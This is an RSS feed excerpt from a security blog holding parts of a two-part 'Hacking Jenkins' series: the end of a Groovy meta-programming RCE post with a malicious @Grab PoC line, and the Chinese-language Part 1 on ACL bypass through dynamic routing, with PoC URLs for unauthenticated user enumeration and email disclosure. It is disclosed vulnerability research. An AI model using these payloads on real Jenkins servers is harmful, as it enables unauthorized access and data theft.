@Grab(group=&apos;tw.orange&apos;, module=&apos;poc&apos;, version=&apos;1&apos;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Video:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!&lt;/p&gt;

&lt;p&gt;Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; I reported, after the vulnerability has been fixed, &lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; also found another &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;entry point&lt;/a&gt; quickly to trigger this vulnerability!&lt;/p&gt;

&lt;p&gt;Apart from that, this vulnerability can also be chained with my previous exploit on &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P&lt;/p&gt;

&lt;p&gt;Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/</link>
                <guid>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</guid>
                <pubDate>Tue, 19 Feb 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在軟體工程中, &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; 及 &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; 一直都被譽為是軟體開發上的必備流程, 有多少優點就不多談, 光是幫助開發者減少許多雜事就是很大的優勢了! 而在 CI/CD 的領域中, Jenkins 是最為老牌且廣為人知的一套工具, 由於它的易用性, 強大的 Pipeline 系統以及對於容器完美的整合使得 Jenkins 也成為目前最多人使用的 CI/CD 應用, 根據 Snyk 在 2018 年所做出的 &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM 生態報告&lt;/a&gt; 中, Jenkins 在 CI/CD 應用中約佔六成的市佔率!&lt;/p&gt;

&lt;p&gt;對於 &lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練(Red Team)&lt;/a&gt; 來說, Jenkins 更是兵家必爭之地, 只要能掌握企業暴露在外的 Jenkins 即可掌握大量的原始碼, 登入憑證甚至控制大量的 Jenkins 節點! 在過去 DEVCORE 所經手過的滲透案子中也出現過數次由 Jenkins 當成進入點, 一步一步從一個小裂縫將目標撕開到完整滲透整間公司的經典案例!&lt;/p&gt;

&lt;p&gt;這篇文章主要是分享去年中針對 Jenkins 所做的一次簡單 Security Review, 過程中共發現了五個 CVE:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中比較被大家所討論的應該是 CVE-2018-1999002, 這是一個在 Windows 下的任意檔案讀取, 由於攻擊方式稍微有趣所以討論聲量較高一點, 這個弱點在外邊也有人做了詳細的分析, 詳情可以參考由騰訊雲鼎實驗室所做的分析(&lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;Jenkins 任意文件读取漏洞分析&lt;/a&gt;), 他們也成功的展示從 &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; 找到一台未修補的 Jenkins 實現任意讀檔到遠端代碼執行取得權限的過程!&lt;/p&gt;

&lt;p&gt;但這篇文章要提的並不是這個, 而是當時為了嘗試繞過 CVE-2018-1999002 所需的最小權限 Overall/Read 時跟進 Jenkins 所使用的核心框架 Stapler 挖掘所發現的另外一個問題 - CVE-2018-1000861! 如果光從官方的漏洞敘述應該會覺得很神奇, 真的可以光從隨便一個網址去達成代碼執行嗎?&lt;/p&gt;

&lt;p&gt;針對這個漏洞, 我的觀點是它就是一個存取控制清單(ACL)上的繞過, 但由於這是 Jenkins 架構上的問題並不是單一的程式編寫失誤, 進而導致了這個漏洞利用上的多樣性! 而為了這個技術債, Jenkins 官方也花費了一番心力(&lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins Patch&lt;/a&gt; 及 &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler Patch&lt;/a&gt;)去修復這個漏洞, 不但在原有的架構上介紹了新的路由黑名單及白名單, 也擴展了原有架構的 &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; 去保護 Jenkins 路由, 下面就來解釋為何 Jenkins 要花了那麼多心力去修復這個漏洞!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;代碼審查範圍&quot;&gt;代碼審查範圍&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;首先要聲明的是, 這並不是一次完整的代碼審查(畢竟要做一次太花時間了…), 因此只針對高風險漏洞進行挖掘, 著眼的範圍包括:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins 核心&lt;/li&gt;
  &lt;li&gt;Stapler 網頁框架&lt;/li&gt;
  &lt;li&gt;建議安裝插件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Jenkins 在安裝過程中會詢問是否安裝建議的套件(像是 Git, GitHub, SVN 與 Pipeline… 等等), 基本上大多數人都會同意不然就只會得到一個半殘的 Jenkins 很不方便XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;jenkins-中的權限機制&quot;&gt;Jenkins 中的權限機制&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;因為這是一個基於 ACL 上的繞過, 所以在解釋漏洞之前, 先來介紹一下 Jenkins 中的權限機制! 在 Jenkins 中有數種不同的角色權限, 甚至有專門的 &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt; (同為建議安裝套件)可針對各專案進行細部的權限設定, 從攻擊者的角度我們粗略分成三種:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;
&lt;p&gt;對於 Jenkins 有完整的控制權, 可對 Jenkins 做任何事! 基本上有這個權限即可透過 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; 介面使用 Groovy 執行任意代碼!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個權限對於駭客來說也是最渴望得到的權限, 但基本上由於安全意識的提升及網路上各種殭屍網路對全網進行掃描, 這種配置已經很少見(或只見於內網)&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;可從 &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; 介面中勾選下面選項來開啟這個模式&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在這個模式下, 所有的內容皆是可讀的, 例如可看到工作日誌或是一些 job/node 等敏感資訊, 對於攻擊者來說在這個模式下最大的好處就是可以獲得大量的原始碼! 但與 Full Access 模式最大的差異則是無法進行更進一步的操作或是執行 Groovy 代碼以取得控制權!&lt;/p&gt;

&lt;p&gt;雖然這不是 Jenkins 的預設設定, 但對於一些習慣自動化的 DevOps 來說還是有可能開啟這個選項, 根據實際在 &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt; 上的調查約 12% 的機器還是開啟這個選項! 以下使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; 來代稱這個模式&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;這是 Jenkins 預設安裝好的設定, 在沒有一組有效的帳號密碼狀況下無法看到任何資訊及進行任何操作! 以下使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 來代稱此模式&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;整個漏洞要從 Jenkins 的 &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;動態路由&lt;/a&gt; 講起, 為了給開發者更大的彈性, Jenkins(嚴格來講是 Stapler)使用了一套 Naming Convention 去匹配路由及動態的執行! 首先 Jenkins 以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 為分隔將 URL 符號化, 接著由 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; 為入口點開始往下搜尋, 如果符號符合 (1) Public 屬性的成員或是 (2) Public 屬性的方法符合下列命名規則, 則調用並繼續往下呼叫:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, …)&lt;/li&gt;
    &lt;li&gt;doDynamic(…)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;看起來 Jenkins 給予開發者很大程度的自由去訪問各個物件, 但過於自由總是不好的，根據這種調用方式這裡就出現了兩個問題!&lt;/p&gt;

&lt;h3 id=&quot;1-萬物皆繼承-javalangobject&quot;&gt;1. 萬物皆繼承 java.lang.Object&lt;/h3&gt;
&lt;p&gt;在 Java 中, 所有的物件皆繼承 &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt; 這個類別, 因此所有在 Java 中的物件皆存在著 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; 這個方法! 而恰巧這個方法又符合命名規則 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#1&lt;/code&gt;, 因此 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; 可在 Jenkins 調用鏈中被動態呼叫!&lt;/p&gt;

&lt;h3 id=&quot;2-跨物件操作導致白名單繞過&quot;&gt;2. 跨物件操作導致白名單繞過&lt;/h3&gt;

&lt;p&gt;前面所提到的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ&lt;/code&gt;, 其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt; 與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; 間最大的不同在於當在禁止的狀況下, 最初的入口點會透過 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt; 多做一個基於白名單的 URL 前綴檢查, 這個白名單如下:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這也代表著一開始可選的入口限制更嚴格選擇更少, 但如果能在一個白名單上的入口找到其他物件參考, 跳到非白名單上的成員豈不可以繞過前述的 URL 前綴限制? 可能有點難理解, 這裡先來一個簡單的範例來解釋 Jenkins 的動態路由機制:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上網址會依序執行下列方法&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的執行鏈一個串一個雖然看起來很流暢, 但難過的是無法取得回傳內容, 因此嚴格來說不能算是一個風險, 但這個例子對於理解整個漏洞核心卻有很大的幫助!&lt;/p&gt;

&lt;p&gt;在了解原理後, 剩下的事就像是在解一個迷宮, 從 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; 這個入口點開始, 物件中的每個成員又可以參考到一個新的物件, 接著要做的就是想辦法把中間錯綜複雜各種物件與物件間的關聯找出來, 一層一層的串下去直到迷宮出口 - 也就是危險的函數呼叫!&lt;/p&gt;

&lt;p&gt;值得一提的是, 這個漏洞最可惜的地方應該是無法針對 SETTER 進行操作, 不然的話應該就又是另外一個有趣的 &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; 或是 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt; 了!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何利用&quot;&gt;如何利用&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;所以該如何利用這個漏洞呢? 簡單說, 這個漏洞所能做到的事情就只是透過物件間的參考去繞過 ACL 政策, 但在此之前我們必須先找到一個好的跳板好讓我們可以更方便的在物件中跳來跳去, 這裡我們選用了下面這個跳板:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個跳板會依序執行下面方法&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 Jenkins 中可以被操作的物件都會繼承一個 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt; 類別, 而繼承這個類別的物件都可以透過 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt; 去存取, 所以總體來說, 可透過這個跳板取得在 Jenkins 中約 500 個 Despicable 的物件類別!&lt;/p&gt;

&lt;p&gt;不過雖是如此, 由於 Jenkins 的設計模式, 大部分開發者在危險動作之前都會再做一次權限檢查, 所以即使可呼叫到 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; 但在沒有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt; 權限的情況下也無法做任何事 :(&lt;/p&gt;

&lt;p&gt;但這個漏洞依然不失成為一個很好的膠水去繞過第一層的 ACL 限制串起其他的漏洞, 為後續的利用開啟了一道窗! 以下我們給出三個串出漏洞鏈的例子!
(雖然只介紹三種, 但由於這個漏洞玩法非常自由可串的絕不只如此, 推薦有興趣的同學可在尋找更多的漏洞鏈!)&lt;/p&gt;

&lt;p&gt;P.S. 值得注意的一點是, 在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt; 的實現中會呼叫到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; 並且傳入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create=True&lt;/code&gt; 導致在記憶體中創造出一個暫存使用者(會出現在使用者列表但無法進行登入操作), 雖然無用不過也被當成一個漏洞記錄在 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-免登入的使用者資訊洩漏&quot;&gt;1. 免登入的使用者資訊洩漏&lt;/h3&gt;

&lt;p&gt;在測試 Jenkins 時, 最怕的就是要進行字典檔攻擊時卻不知道該攻擊哪個帳號, 畢竟帳號永遠比密碼難猜! 這時這個漏洞就很好用了XD&lt;/p&gt;

&lt;p&gt;由於 Jenkins 對搜尋的功能並沒有加上適當的權限檢查, 因此在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 的狀況下可以透過修改 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt; 參數從 a 到 z 去列舉出所有使用者!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;除此之外也可搭配由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; 所回報的 &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; 進一步取得使用者信箱, 如:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-與-cve-2018-1000600-搭配成免登入且有完整回顯的-ssrf&quot;&gt;2. 與 CVE-2018-1000600 搭配成免登入且有完整回顯的 SSRF&lt;/h3&gt;

&lt;p&gt;下一個要串的漏洞則是 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, 這是一個由 &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(對就是我XD) 所回報的漏洞, 關於這個漏洞官方的描述是:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

